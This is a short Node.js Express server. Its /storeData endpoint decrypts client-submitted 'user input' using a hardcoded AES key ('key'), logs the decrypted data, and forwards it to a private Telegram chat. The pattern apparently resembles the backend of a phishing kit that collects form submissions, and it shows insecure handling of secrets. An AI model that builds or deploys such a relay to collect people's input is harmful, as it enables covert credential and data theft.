const express = require("express");
const bodyParser = require("body-parser");
const app = express();
const port = 8080;
const CryptoJS = require("crypto-js");

require("dotenv").config();

const SECRET_KEY = 'key';
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.use(bodyParser.json());

app.use(express.static("public"));

app.post("/storeData", async (req, res) => {
  const encryptedData = req.body.data;
  console.log("Received user input:", encryptedData);

  const bytes = CryptoJS.AES.decrypt(encryptedData, SECRET_KEY);
  const decryptedData = JSON.parse(bytes.toString(CryptoJS.enc.Utf8));

  console.log('Decrypted data:', decryptedData);

  const message = `Received user input: ${JSON.stringify(decryptedData)}`;

  const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    const fetch = await import("node-fetch");
    const response = await fetch.default(telegramApiUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      }),
    });

    if (!response.ok) {
      throw new Error("Failed to send message to Telegram");
    }

    res.status(200).send("Data stored and sent to Telegram successfully");
  } catch (error) {
    console.error("Error sending message to Telegram:", error);
    res.status(500).send("Failed to send data to Telegram");
  }
});

// Start server
app.listen(port, () => {
  console.log(`Backend server running at http://localhost:${port}`);
});
